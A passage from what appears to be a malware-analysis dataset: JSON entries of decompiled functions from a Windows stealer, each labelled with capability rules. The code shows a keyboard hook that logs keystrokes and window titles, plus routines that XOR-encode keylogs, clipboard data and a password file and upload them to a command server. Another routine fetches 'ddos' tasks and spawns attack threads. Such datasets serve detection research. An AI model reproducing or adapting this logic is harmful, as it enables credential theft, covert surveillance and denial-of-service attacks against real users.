pcVar6 = *(*0x444b3c + 8);\n                pcVar5 = pcVar6 + 1;\n                do {\n                    cVar2 = *pcVar6;\n                    pcVar6 = pcVar6 + 1;\n                } while (cVar2 != '\\0');\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                iVar10 = *(*0x444b3c + 8);\n                iVar7 = 0;\n                iVar11 = 0;\n                if (0 < iVar4) {\n                    do {\n                        if (pcVar6 - pcVar5 <= iVar11) {\n                            iVar11 = 0;\n                        }\n                        arg_8h[iVar7] = arg_8h[iVar7] ^ -*(iVar11 + iVar10);\n                        iVar7 = iVar7 + 1;\n                        iVar11 = iVar11 + 1;\n                    } while (iVar7 < iVar4);\n                }\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                pcVar6 = *(*0x444b3c + 0x94);\n                pcVar5 = pcVar6 + 1;\n                do {\n                    cVar2 = *pcVar6;\n                    pcVar6 = pcVar6 + 1;\n                } while (cVar2 != '\\0');\n                pcVar8 = fcn.00405f40();\n                pcVar1 = pcVar8 + 1;\n                do {\n                    cVar2 = *pcVar8;\n                    pcVar8 = pcVar8 + 1;\n                } while (cVar2 != '\\0');\n                uVar3 = fcn.0041ff97(pcVar6 + pcVar8 + ((0x80 - pcVar1) - pcVar5));\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                uVar9 = *(*0x444b3c + 0x94);\n                fcn.00405f40();\n                fcn.00420bd5(uVar3, \"%s?enc&comp=%s&ext=clipboard.txt\", uVar9);\n                uVar9 = fcn.004015f0();\n                while( true ) {\n                    auStack16[0] = 0;\n                    iVar10 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(auStack16, 0);\n                    if ((iVar10 != 0) && (iVar10 = fcn.004046c0(arg_8h, iVar4, auStack16),  iVar10 != 0)) break;\n                    (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n                }\n                fcn.00420c59(uVar9);\n                fcn.00420c59(uVar3);\n            }\n        }\n        (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n    } while( true );\n}\n",
        "token_count": 1016
    },
    "00408db0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00408db0(void)\n\n{\n    uint arg_10h;\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar auStack284 [4];\n    int32_t iStack280;\n    int32_t iStack276;\n    char acStack272 [260];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ auStack284;\n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    do {\n        iStack280 = fcn.004015f0();\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar3 = *(*0x444b3c + 0x94);\n        pcVar5 = pcVar3 + 1;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        pcVar4 = fcn.00405f40();\n        pcVar6 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        uVar2 = fcn.0041ff97(pcVar3 + pcVar4 + ((0x20 - pcVar6) - pcVar5));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(uVar2, \"%s?cstorage=ddos&comp=%s\", arg_10h);\n        pcVar5 = fcn.00404300();\n        while (pcVar5 == NULL) {\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n            pcVar5 = fcn.00404300();\n        }\n        fcn.00420c59(iStack280);\n        fcn.00420c59(uVar2);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar6 = *(*0x444b3c + 8);\n        pcVar3 = pcVar6 + 1;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iStack276 = pcVar6 - pcVar3;\n        pcVar3 = pcVar5;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        iVar9 = *(*0x444b3c + 8);\n        iVar7 = 0;\n        iVar8 = 0;\n        if (0 < pcVar3 - (pcVar5 + 1)) {\n            do {\n                if (iStack276 <= iVar8) {\n                    iVar8 = 0;\n                }\n                pcVar5[iVar7] = pcVar5[iVar7] ^ -*(iVar8 + iVar9);\n                iVar7 = iVar7 + 1;\n                iVar8 = iVar8 + 1;\n            } while (iVar7 < pcVar3 - (pcVar5 + 1));\n        }\n        pcVar3 = pcVar5;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        if (pcVar3 != pcVar5 + 1) {\n            uVar2 = fcn.00420d1e(\"NUMBER_OF_PROCESSORS\");\n            iStack280 = fcn.00423677(uVar2);\n            iStack280 = iStack280 * 3;\n            if (iStack280 == 0) {\n                iStack280 = 2;\n            }\n            iVar9 = iStack280;\n            iStack276 = 0;\n            cVar1 = fcn.00405130(pcVar5, 0, 10, acStack272, 0x100);\n            while (cVar1 != '\\0') {\n                iVar7 = iVar9;\n                if (0 < iVar9) {\n                    do {\n                        iVar7 = fcn.0041ff97(0x100);\n                        pcVar3 = acStack272;\n                        iVar8 = iVar7 - pcVar3;\n                        do {\n                            cVar1 = *pcVar3;\n                            pcVar3[iVar8] = cVar1;\n                            pcVar3 = pcVar3 + 1;\n                        } while (cVar1 != '\\0');\n                        (*_sym.imp.KERNEL32.DLL_CreateThread)(0, 0, fcn.00408ca0, iVar7, 0, 0);\n                        iVar9 = iVar9 + -1;\n                        iVar7 = iStack280;\n                    } while (iVar9 != 0);\n                }\n                cVar1 = fcn.00405130(pcVar5, 0, 10, acStack272, 0x100);\n                iVar9 = iVar7;\n            }\n            (*_sym.imp.KERNEL32.DLL_Sleep)(6000000);\n        }\n        fcn.00420c59(pcVar5);\n        (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n    } while( true );\n}\n",
        "token_count": 1320
    },
    "00409020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409020(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    char cVar13;\n    char acStack348 [4];\n    int32_t *piStack344;\n    int32_t *piStack340;\n    uint uStack336;\n    char *pcStack332;\n    uint uStack328;\n    uint uStack324;\n    uint16_t uStack320;\n    char cStack318;\n    char *apcStack300 [2];\n    uint uStack292;\n    char *apcStack288 [4];\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ acStack348;\n    piStack340 = arg_10h;\n    if (((arg_ch != 0x100) || (arg_8h != 0)) || ((arg_10h >> 0x10 & 0x8000) != 0)) goto code_r0x004098df;\n    if (0x9b < *arg_10h - 8U) {\ncode_r0x004093dc:\n        cVar13 = *arg_10h;\n        pcStack332 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (pcStack332 != *0x444a8c) {\n            (*_sym.imp.USER32.dll_GetWindowTextA)(pcStack332, apcStack300 + 1, 0x100);\n            puVar4 = &uStack292;\n            do {\n                cVar1 = *puVar4;\n                puVar4 = puVar4 + 1;\n            } while (cVar1 != '\\0');\n            pcVar5 = fcn.0041ff97(puVar4 + (0x10 - (&uStack292 + 1)));\n            pcStack332 = pcVar5;\n            fcn.00420bd5(pcVar5, \"\\n\\n[%s]\\n\", &uStack292);\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            fcn.004050e0(pcStack332);\n            fcn.00420c59(uStack336);\n        }\n        *0x444a8c = pcStack332;\n        uVar6 = (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(pcStack332, 0);\n        pcVar2 = _sym.imp.USER32.dll_GetKeyState;\n        uVar7 = (*_sym.imp.USER32.dll_GetKeyState)(0x14);\n        if ((((uVar7 & 1) == 0) && (uVar3 = (*pcVar2)(0x10),  (uVar3 & 0x8000) == 0)) && (cVar13 + 0xbfU < 0x1a)) {\n            cVar13 = cVar13 + ' ';\n        }\n        uVar7 = (*pcVar2)(0x14);\n        if (((uVar7 & 1) != 0) || (uVar3 = (*pcVar2)(0x10),  (uVar3 & 0x8000) != 0)) {\n            if (cVar13 == '1') {\n                cVar13 = '!';\n            }\n            else if (cVar13 == '2') {\n                cVar13 = '@';\n            }\n            else if (cVar13 == '3') {\n                cVar13 = '#';\n            }\n            else if (cVar13 == '4') {\n                cVar13 = '$';\n            }\n            else if (cVar13 == '5') {\n                cVar13 = '%';\n            }\n            else if (cVar13 == '6') {\n                cVar13 = '^';\n            }\n            else if (cVar13 == '7') {\n                cVar13 = '&';\n            }\n            else if (cVar13 == '8') {\n                cVar13 = '*';\n            }\n            else if (cVar13 == '9') {\n                cVar13 = '(';\n            }\n            else if (cVar13 == '0') {\n                cVar13 = ')';\n            }\n        }\n        iVar8 = (*_sym.imp.USER32.dll_GetKeyboardLayout)(uVar6);\n        if ((iVar8 == 0x4190419) || (iVar8 == 0x4220422)) {\n            apcStack300[0] = 0x43def0;\n            apcStack300[1] = 0x43def4;\n            uStack292 = 0x43def8;\n            apcStack288[0] = 0x43defc;\n            apcStack288[1] = 0x43df00;\n            apcStack288[2] = 0x43df08;\n            apcStack288[3] = 0x43df0c;\n            uStack272 = 0x43df10;\n            uStack268 = 0x43df14;\n            uStack264 = 0x43df18;\n            uStack260 = 0x43df1c;\n            uStack256 = 0x43df20;\n            uStack252 = 0x43df24;\n            uStack248 = 0x43df28;\n            uStack244 = 0x43df2c;\n            uStack240 = 0x43df30;\n            uStack236 = 0x43df34;\n            uStack232 = 0x43df38;\n            uStack228 = 0x43df3c;\n            uStack224 = 0x43df40;\n            uStack220 = 0x43df44;\n            uStack216 = 0x43df48;\n            uStack212 = 0x43df4c;\n            uStack208 = 0x43df50;\n            uStack204 = 0x43df54;\n            uStack200 = 0x43df58;\n            uStack196 = 0x43df5c;\n            uStack192 = 0x43df60;\n            uStack188 = 0x43df68;\n            uStack184 = 0x43df6c;\n            uStack180 = 0x43df70;\n            uStack176 = 0x43df74;\n            uStack172 = 0x43df78;\n            uStack168 = 0x43df7c;\n            uStack164 = 0x43df80;\n            uStack160 = 0x43df84;\n            uStack156 = 0x43df88;\n            uStack152 = 0x43df90;\n            uStack148 = 0x43df94;\n            uStack144 = 0x43df98;\n            uStack140 = 0x43df9c;\n            uStack136 = 0x43dfa0;\n            uStack132 = 0x43dfa4;\n            uStack128 = 0x43dfa8;\n            uStack124 = 0x43dfac;\n            uStack120 = 0x43dfb0;\n            uStack116 = 0x43dfb4;\n            uStack112 = 0x43dfb8;\n            uStack108 = 0x43dfbc;\n            uStack104 = 0x43dfc0;\n            uStack100 = 0x43dfc4;\n            uStack96 = 0x43dfc8;\n            uStack92 = 0x43dfcc;\n            uStack88 = 0x43dfd0;\n            uStack84 = 0x43dfd4;\n            uStack80 = 0x43dfd8;\n            uStack76 = 0x43dfdc;\n            uStack72 = 0x43dfe0;\n            uStack68 = 0x43dfe4;\n            uStack64 = 0x43dfe8;\n            uStack60 = 0x43dfec;\n            uStack56 = 0x43dff0;\n            uStack52 = 0x43dff4;\n            uStack48 = 0x43dff8;\n            uStack44 = 0x43dffc;\n            uStack40 = 0x43e000;\n            uStack36 = 0x43e004;\n            uStack32 = 0x43e008;\n            uStack28 = 0x43e00c;\n            uStack24 = 0x43e010;\n            iVar11 = 0;\n            do {\n                if (cVar13 == *apcStack300[iVar11]) {\n                    cVar13 = apcStack300[iVar11][1];\n                }\n                if (cVar13 == *apcStack300[iVar11 + 1]) {\n                    cVar13 = apcStack300[iVar11 + 1][1];\n                }\n                if (cVar13 == *(&uStack292)[iVar11]) {\n                    cVar13 = (&uStack292)[iVar11][1];\n                }\n                if (cVar13 == *apcStack288[iVar11]) {\n                    cVar13 = apcStack288[iVar11][1];\n                }\n                if (cVar13 == *apcStack288[iVar11 + 1]) {\n                    cVar13 = apcStack288[iVar11 + 1][1];\n                }\n                iVar11 = iVar11 + 5;\n            } while (iVar11 < 0x46);\n            if (iVar8 == 0x4220422) {\n                if (cVar13 == -0x26) {\n                    cVar13 = -0x51;\n                }\n                else if (cVar13 == -0x23) {\n                    cVar13 = -0x56;\n                }\n            }\n        }\n        fcn.00420bd5(acStack348, 0x43ddd8, cVar13);\n        pcVar9 = acStack348;\n        pcVar5 = acStack348 + 1;\n        do {\n            cVar13 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar13 != '\\0');\n        *0x444b4c = fcn.004228ad(*0x444b4c, pcVar9 + *0x444b50 + (1 - pcVar5));\n        if (*0x444b50 < pcVar9 + (*0x444b50 - pcVar5)) {\n            pcVar12 = acStack348;\n            pcVar10 = *0x444b50;\n            do {\n                pcVar10[*0x444b4c] = *pcVar12;\n                pcVar10 = pcVar10 + 1;\n                pcVar12 = pcVar12 + 1;\n            } while (pcVar10 < pcVar9 + (*0x444b50 - pcVar5));\n        }\n        *0x444b50 = pcVar9 + (*0x444b50 - pcVar5);\n        (*0x444b50)[*0x444b4c] = '\\0';\n        arg_10h = piStack344;\n        goto code_r0x004098df;\n    }\n    // switch table (156 cases) at 0x409908\n    switch(*(*(*arg_10h + 0x409944) * 4 + 0x409908)) {\n    case 0x409089:\n        uStack328 = str._CAPSLOCK_._0_4_;\n        uStack324 = str._CAPSLOCK_._4_4_;\n        puVar4 = &uStack328;\n        cStack318 = str._CAPSLOCK_[10];\n        uStack320 = str._CAPSLOCK_._8_2_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x4090df:\n        uStack324 = str._SHIFT_._4_4_;\n        puVar4 = &uStack328;\n        uStack328 = str._SHIFT_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x409109:\n        uStack324 = str._LCTRL_._4_4_;\n        puVar4 = &uStack328;\n        uStack328 = str._LCTRL_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x40912c:\n        uStack324 = str._RCTRL_._4_4_;\n        puVar4 = &uStack328;\n        uStack328 = str._RCTRL_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x409152:\n        uStack324 = str._INSERT_._4_4_;\n        puVar4 = &uStack328;\n        uStack328 = str._INSERT_._0_4_;\n        uStack320 = uStack320 & 0xff00 | str._INSERT_[8];\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        fcn.004050e0(&uStack328);\n        goto code_r0x004098df;\n    case 0x409195:\n        uStack328 = str._END_._0_4_;\n        puVar4 = &uStack328;\n        uStack324 = uStack324 & 0xffff0000 | str._END_._4_2_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        fcn.004050e0(&uStack328);\n        goto code_r0x004098df;\n    case 0x4091d0:\n        uStack328 = str._PRINT_._0_4_;\n        puVar4 = &uStack328;\n        uStack324 = str._PRINT_._4_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        fcn.004050e0(&uStack328);\n        goto code_r0x004098df;\n    case 0x40920f:\n        uStack328 = str._DELETE_._0_4_;\n        puVar4 = &uStack328;\n        uStack320 = uStack320 & 0xff00 | str._DELETE_[8];\n        uStack324 = str._DELETE_._4_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x40923f:\n        uStack324 = uStack324 & 0xffffff00 | str._BK_[4];\n        puVar4 = &uStack328;\n        uStack328 = str._BK_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x40926c:\n        puVar4 = &uStack328;\n        uStack328 = str._LEFT_._0_4_;\n        uStack324._0_3_ = CONCAT12(str._LEFT_[6], str._LEFT_._4_2_);\n        uStack324 = uStack324 & 0xff000000 | uStack324;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        fcn.004050e0(&uStack328);\n        goto code_r0x004098df;\n    case 0x4092b1:\n        uStack328 = str._RIGHT_._0_4_;\n        puVar4 = &uStack328;\n        uStack324 = str._RIGHT_._4_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        fcn.004050e0(&uStack328);\n        goto code_r0x004098df;\n    case 0x4092ef:\n        uStack328 = str._UP_._0_4_;\n        puVar4 = &uStack328;\n        uStack324 = uStack324 & 0xffffff00 | str._UP_[4];\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        fcn.004050e0(&uStack328);\n        goto code_r0x004098df;\n    case 0x40932f:\n        uStack328 = str._DOWN_._0_4_;\n        puVar4 = &uStack328;\n        uStack324 = CONCAT22(CONCAT11(uStack324._3_1_, str._DOWN_[6]), str._DOWN_._4_2_);\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x409361:\n        uStack324 = str._ENTER_._4_4_;\n        puVar4 = &uStack328;\n        uStack328 = str._ENTER_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x40938c:\n        uStack324 = uStack324 & 0xffff0000 | str._TAB_._4_2_;\n        puVar4 = &uStack328;\n        uStack328 = str._TAB_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x4093b4:\n        uStack324 = str._SPACE_._4_4_;\n        puVar4 = &uStack328;\n        uStack328 = str._SPACE_._0_4_;\n        do {\n            cVar13 = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (cVar13 != '\\0');\n        break;\n    case 0x4093dc:\n        goto code_r0x004093dc;\n    }\n    fcn.004050e0(&uStack328);\ncode_r0x004098df:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(0, arg_8h, arg_ch);\n    fcn.00420bc6(arg_10h);\n    return;\n}\n",
        "token_count": 4662
    },
    "00409a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00409a40(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint arg_10h;\n    int32_t iVar4;\n    uint uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint uStack20;\n    int32_t iStack16;\n    uint uStack12;\n    \n    uVar5 = fcn.00420e6f(0);\n    fcn.00420c64(uVar5);\n    do {\n        while (*0x444b50 < 1) {\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        }\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar6 = *(*0x444b3c + 8);\n        pcVar1 = pcVar6 + 1;\n        do {\n            cVar3 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar3 != '\\0');\n        iStack16 = pcVar6 - pcVar1;\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        iVar9 = *0x444b50;\n        iVar4 = *0x444b4c;\n        iVar10 = *(*0x444b3c + 8);\n        iVar7 = 0;\n        iVar11 = 0;\n        if (0 < *0x444b50) {\n            do {\n                if (iStack16 <= iVar11) {\n                    iVar11 = 0;\n                }\n                *(iVar7 + iVar4) = *(iVar7 + iVar4) ^ -*(iVar11 + iVar10);\n                iVar7 = iVar7 + 1;\n                iVar11 = iVar11 + 1;\n            } while (iVar7 < iVar9);\n        }\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar6 = *(*0x444b3c + 0x94);\n        pcVar1 = pcVar6 + 1;\n        do {\n            cVar3 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar3 != '\\0');\n        pcVar8 = fcn.00405f40();\n        pcVar2 = pcVar8 + 1;\n        do {\n            cVar3 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar3 != '\\0');\n        uVar5 = fcn.0041ff97(pcVar6 + pcVar8 + ((0x40 - pcVar2) - pcVar1));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(uVar5, \"%s?enc&comp=%s&ext=kl.txt\", arg_10h);\n        uStack12 = fcn.004015f0();\n        while( true ) {\n            iVar4 = *0x444b50;\n            iVar10 = *0x444b4c;\n            iStack16 = 0;\n            iVar9 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&iStack16, 0);\n            if ((iVar9 != 0) && (iVar10 = fcn.004046c0(iVar10, iVar4, &stack0xffffffe8),  iVar10 != 0)) break;\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        }\n        fcn.00420c59(uStack20);\n        fcn.00420c59(uVar5);\n        *0x444b50 = 0;\n        fcn.004214f1(*0x444b4c);\n        *0x444b4c = fcn.00422819(1);\n        (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n    } while( true );\n}\n",
        "token_count": 993
    },
    "00409c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00409c90(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint arg_10h;\n    uint uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint arg_8h;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uVar3 = fcn.00420e6f(0);\n    fcn.00420c64(uVar3);\ncode_r0x00409cb0:\n    pcVar4 = fcn.00420d1e(\"TEMP\");\n    pcVar5 = pcVar4;\n    do {\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    uVar3 = fcn.0041ff97(pcVar5 + (0x12 - (pcVar4 + 1)));\n    fcn.00420bd5(uVar3, 0x43c26c, pcVar4);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar3);\n    if (iVar6 != 0) {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = *(*0x444b3c + 0x94);\n        pcVar5 = pcVar4 + 1;\n        do {\n            cVar2 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar2 != '\\0');\n        pcVar7 = fcn.00405f40();\n        pcVar1 = pcVar7 + 1;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        arg_8h = fcn.0041ff97(pcVar4 + pcVar7 + ((0x80 - pcVar1) - pcVar5));\n        uStack16 = arg_8h;\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(arg_8h, \"%s?enc&comp=%s&ext=pwd.txt\", arg_10h);\n        uStack20 = fcn.004015f0();\n        do {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar3);\n            if (iVar6 != 0) {\n                uStack24 = 0;\n                iVar6 = fcn.00401db0(uVar3);\n                if (iVar6 != 0) {\n                    iVar9 = 0;\n                    uStack28 = 0;\n                    iVar8 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&uStack28, 0);\n                    if (iVar8 != 0) {\n                        iVar9 = fcn.004046c0(iVar6, uStack24, &uStack28);\n                    }\n                    fcn.00420c59(iVar6);\n                    if (iVar9 != 0) goto code_r0x00409e04;\n                }\n            }\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        } while( true );\n    }\n    goto code_r0x00409e27;\ncode_r0x00409e04:\n    fcn.00420c59(uStack20);\n    fcn.00420c59(uStack16);\n    fcn.004227e9(uVar3);\n    fcn.00420c59(uVar3);\ncode_r0x00409e27:\n    (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n    goto code_r0x00409cb0;\n}\n",
        "token_count": 921
    },
    "00409ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409ed0(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint arg_10h;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint arg_8h_00;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack12;\n    \n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    iStack12 = 0;\n    if (arg_8h != 0) {\n        iStack12 = arg_8h;\n    }\ncode_r0x00409eff:\n    pcVar3 = fcn.004020c0();\n    pcVar4 = fcn.00420d1e(\"TEMP\");\n    pcVar6 = pcVar4 + 1;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    pcVar5 = pcVar3;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    pcVar6 = fcn.0041ff97(pcVar4 + pcVar5 + ((8 - (pcVar3 + 1)) - pcVar6));\n    uVar2 = fcn.00420d1e(\"TEMP\");\n    fcn.00420bd5(pcVar6, 0x43c26c, uVar2);\n    fcn.00409e40();\n    fcn.00420c59(pcVar3);\n    iVar7 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(pcVar6);\n    if (iVar7 != 0) {\n        pcVar3 = pcVar6;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        uVar2 = fcn.0041ff97(pcVar3 + (8 - (pcVar6 + 1)));\n        uStack24 = uVar2;\n        fcn.00420bd5(uVar2, \"%s.cr\", pcVar6);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        